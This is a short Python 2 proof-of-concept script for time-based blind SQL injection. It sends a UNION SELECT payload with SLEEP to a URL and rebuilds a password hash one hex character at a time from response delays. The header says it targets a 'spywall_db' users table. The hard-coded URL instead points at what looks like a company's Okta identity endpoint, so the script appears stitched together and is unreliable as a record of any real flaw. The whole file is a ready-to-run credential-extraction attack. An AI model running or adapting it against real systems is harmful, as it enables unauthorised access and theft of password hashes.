#!/usr/bin/python
# @_Kc57
# Blind SQLi POC
# Dumps out the first available hash in the users table of spywall_db

import urllib
import time
from time import sleep

timing='2.5'
checks = 0

def check_char(i, pos):
	global timimg
	global checks
	checks += 1
	url = 'https://grammarly.okta.com/idp/idx/identify?fromURI=1 union select 1,2, IF (%s=conv(mid((select password from users),%s,1),16,10),SLEEP(%s),null);--' % (i,pos,timing)
	start = time.time()
	urllib.urlopen(url)
	end = time.time()
	howlong = end-start
	return howlong

def check_pos(pos):

	for m in range(0,16):
		output = check_char(m, pos)
		print "[*] Character %s - Took %s seconds" % (hex(m)[2:],output)
		if output > 2:
			return hex(m)[2:]
			

md5 = ''
start = time.time()
for y in range(1,33):
	print "Checking position %s" % (y)
	md5 += check_pos(y)
	print md5
	end = time.time()
	howlong = end-start

print "1st hash:%s" % (md5)
print "Found in %s queries" % (checks)
print "Found in %s" %(howlong)
            